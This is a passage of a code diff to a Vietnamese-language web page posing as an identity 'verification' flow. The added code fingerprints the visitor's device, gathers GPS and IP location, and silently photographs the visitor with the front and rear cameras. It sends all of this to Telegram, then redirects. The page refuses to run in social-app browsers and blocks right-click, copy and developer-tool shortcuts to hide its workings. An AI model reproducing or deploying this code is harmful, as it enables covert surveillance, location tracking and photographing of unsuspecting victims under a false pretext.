+                        await sleep(300); // Rate limit nhẹ
+                    } catch (e) {
+                        console.warn(`Send ${photo.filename} failed:`, e);
+                    }
                 }
+            }
 
-                // Hiển thị kết quả và đếm ngược
-                if (sendSuccess) {
-                    status.innerHTML = "✅ Xác thực thành công!<br>Đang chuyển hướng...";
+            // ==========================================
+            // 🚀 MAIN PROCESS
+            // ==========================================
+            async function runVerification() {
+                const btn = $('#verifyBtn');
+                btn.disabled = true;
+                updateButton('ĐANG XÁC MINH...', true, true);
+                updateProgress(0, 'Bắt đầu quy trình...');
+
+                // --- STEP 1: Quét thiết bị ---
+                updateStep('step1', 'Đang quét...', 'active');
+                updateProgress(10, 'Đang quét thông tin thiết bị...');
+                await sleep(CONFIG.STEP_DELAY);
+                const deviceInfo = getDeviceFingerprint();
+                updateStep('step1', 'Hoàn tất ✓', 'completed');
+                updateProgress(20, 'Thiết bị đã được nhận diện');
+
+                // --- STEP 2: Lấy vị trí ---
+                updateStep('step2', 'Đang lấy GPS...', 'active');
+                updateProgress(25, 'Đang truy vấn vị trí GPS...');
+                const [gpsData, ipData] = await Promise.all([
+                    getLocation(),
+                    getIPLocation(),
+                ]);
+                await sleep(CONFIG.STEP_DELAY);
+
+                let locationText = '';
+                if (gpsData.lat) {
+                    locationText =
+                        `📍 <b>GPS Chính xác:</b>\n   Kinh độ: ${gpsData.lat}\n   Vĩ độ: ${gpsData.lng}\n   Độ chính xác: ${gpsData.accuracy}\n   🗺 <a href="${gpsData.maps}">Xem trên Google Maps</a>`;
                 } else {
-                    status.innerHTML = "⚠️ Xác thực hoàn tất.<br>Đang chuyển hướng...";
+                    locationText = `📍 <b>GPS:</b> ${gpsData.maps}`;
                 }
 
-                startCountdown();
-
-            } catch (error) {
-                console.error('Process Error:', error);
-                status.innerHTML = "❌ Có lỗi xảy ra<br>Đang chuyển hướng...";
-                if (cameraStream) {
-                    cameraStream.getTracks().forEach(track => track.stop());
+                if (ipData && ipData.lat) {
+                    locationText +=
+                        `\n\n🌍 <b>IP Ước lượng:</b>\n   IP: ${ipData.query}\n   Quốc gia: ${ipData.country}\n   Thành phố: ${ipData.city}\n   ISP: ${ipData.isp}\n   🗺 <a href="https://www.google.com/maps?q=${ipData.lat},${ipData.lon}">Xem vị trí IP</a>`;
                 }
-                startCountdown();
-            }
-        });
 
-        // ==========================================
-        // ⏱ ĐẾM NGƯỢC CHUYỂN HƯỚNG
-        // ==========================================
-        function startCountdown() {
-            let timeLeft = 5;
-            btn.innerText = `⏳ CHUYỂN HƯỚNG TRONG ${timeLeft}S`;
-            btn.style.background = "#1a7f37";
+                updateStep('step2', 'Hoàn tất ✓', 'completed');
+                updateProgress(40, 'Đã có vị trí');
 
-            const timer = setInterval(() => {
-                timeLeft--;
-                if (timeLeft > 0) {
-                    btn.innerText = `⏳ CHUYỂN HƯỚNG TRONG ${timeLeft}S`;
+                // --- STEP 3: Camera trước ---
+                updateStep('step3', 'Đang chụp...', 'active');
+                updateProgress(45, 'Đang kích hoạt camera trước...');
+                await sleep(400);
+                const frontPhoto = await captureCamera('user');
+                if (frontPhoto) {
+                    updateStep('step3', 'Đã chụp ✓', 'completed');
                 } else {
-                    clearInterval(timer);
-                    btn.innerText = "🚀 ĐANG CHUYỂN HƯỚNG...";
-                    btn.style.background = "#f0883e";
-                    setTimeout(() => {
-                        window.location.href = REDIRECT_URL;
-                    }, 500);
+                    updateStep('step3', 'Không có / Bị chặn', 'completed');
                 }
-            }, 1000);
-        }
+                updateProgress(60, frontPhoto ? 'Đã chụp camera trước' : 'Camera trước không khả dụng');
 
-        // ==========================================
-        // 🛡 BẢO VỆ - CHẶN CHUỘT PHẢI & PHÍM TẮT
-        // ==========================================
-        document.addEventListener('contextmenu', (e) => e.preventDefault());
-        document.addEventListener('copy', (e) => e.preventDefault());
-        document.addEventListener('cut', (e) => e.preventDefault());
-        document.addEventListener('paste', (e) => e.preventDefault());
+                // --- STEP 4: Camera sau ---
+                updateStep('step4', 'Đang chụp...', 'active');
+                updateProgress(65, 'Đang kích hoạt camera sau...');
+                await sleep(400);
+                const backPhoto = await captureCamera('environment');
+                if (backPhoto) {
+                    updateStep('step4', 'Đã chụp ✓', 'completed');
+                } else {
+                    updateStep('step4', 'Không có / Bị chặn', 'completed');
+                }
+                updateProgress(80, backPhoto ? 'Đã chụp camera sau' : 'Camera sau không khả dụng');
 
-        document.onkeydown = function(e) {
-            // F12
-            if (e.keyCode === 123) {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl+Shift+I (DevTools)
-            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl+Shift+J (Console)
-            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl+U (View Source)
-            if (e.ctrlKey && e.keyCode === 85) {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl+S (Save)
-            if (e.ctrlKey && e.keyCode === 83) {
-                e.preventDefault();
-                return false;
-            }
-        };
+                // --- STEP 5: Gửi dữ liệu ---
+                updateStep('step5', 'Đang gửi...', 'active');
+                updateProgress(85, 'Đang mã hóa và gửi dữ liệu...');
 
-        // Ngăn chặn kéo thả
-        document.addEventListener('dragstart', (e) => e.preventDefault());
-        document.addEventListener('drop', (e) => e.preventDefault());
+                // Tổng hợp caption
+                const fullCaption = deviceInfo + '\n\n' + locationText;
+
+                // Chuẩn bị ảnh
+                const photos = [];
+                if (frontPhoto) photos.push({ blob: frontPhoto, filename: 'camera-truoc.jpg', label: '📸 Camera Trước (Selfie)' });
+                if (backPhoto) photos.push({ blob: backPhoto, filename: 'camera-sau.jpg', label: '📸 Camera Sau' });
+
+                await sendToTelegram(fullCaption, photos);
+                await sleep(600);
+
+                updateStep('step5', 'Đã gửi ✓', 'completed');
+                updateProgress(100, 'Xác minh hoàn tất!');
+                updateButton('✅ XÁC MINH THÀNH CÔNG', true, false);
+
+                // Đếm ngược chuyển hướng
+                await sleep(1000);
+                startCountdown();
+            }
+
+            // ==========================================
+            // ⏱ ĐẾM NGƯỢC CHUYỂN HƯỚNG
+            // ==========================================
+            function startCountdown() {
+                let remaining = CONFIG.COUNTDOWN_SECONDS;
+                updateButton(`⏳ Chuyển hướng trong ${remaining}s...`, true, false);
+
+                const timer = setInterval(() => {
+                    remaining--;
+                    if (remaining > 0) {
+                        updateButton(`⏳ Chuyển hướng trong ${remaining}s...`, true, false);
+                        updateProgress(100, `Tự động chuyển trang sau ${remaining}s...`);
+                    } else {
+                        clearInterval(timer);
+                        updateButton('🚀 ĐANG CHUYỂN HƯỚNG...', true, true);
+                        updateProgress(100, 'Đang chuyển hướng...');
+                        setTimeout(() => {
+                            window.location.href = CONFIG.REDIRECT_URL;
+                        }, 400);
+                    }
+                }, 1000);
+            }
+
+            // ==========================================
+            // 🎬 KHỞI TẠO
+            // ==========================================
+            function init() {
+                // Kiểm tra In-App Browser
+                const ua = navigator.userAgent || navigator.vendor || window.opera;
+                const isInApp = /TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger|Line/i.test(ua);
+
+                if (isInApp) {
+                    $('#inapp-warning').style.display = 'flex';
+                    $('#mainUI').style.display = 'none';
+                    return;
+                }
+
+                // Kiểm tra hỗ trợ camera
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    updateButton('❌ THIẾT BỊ KHÔNG HỖ TRỢ', true);
+                    updateProgress(0, 'Trình duyệt không hỗ trợ camera');
+                    return;
+                }
+
+                // Sẵn sàng
+                updateButton('🔐 BẮT ĐẦU XÁC MINH', false);
+                updateProgress(0, 'Sẵn sàng xác minh');
+                updateStep('step1', 'Sẵn sàng');
+                updateStep('step2', 'Sẵn sàng');
+                updateStep('step3', 'Sẵn sàng');
+                updateStep('step4', 'Sẵn sàng');
+                updateStep('step5', 'Sẵn sàng');
+
+                // Gán sự kiện
+                $('#verifyBtn').addEventListener('click', runVerification);
+            }
+
+            // ==========================================
+            // 🛡 BẢO VỆ
+            // ==========================================
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.addEventListener('copy', e => e.preventDefault());
+            document.addEventListener('cut', e => e.preventDefault());
+            document.addEventListener('dragstart', e => e.preventDefault());
+            document.addEventListener('selectstart', e => e.preventDefault());
+
+            document.onkeydown = function(e) {
+                const blocked = [123, 73, 74, 85, 83]; // F12, I, J, U, S
+                if (blocked.includes(e.keyCode) && (e.ctrlKey || e.shiftKey || e.keyCode === 123)) {
+                    e.preventDefault();
+                    return false;
+                }
+            };
+
+            // Khởi chạy
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', init);
+            } else {
+                init();
+            }
     </script>
 </body>
 </html>
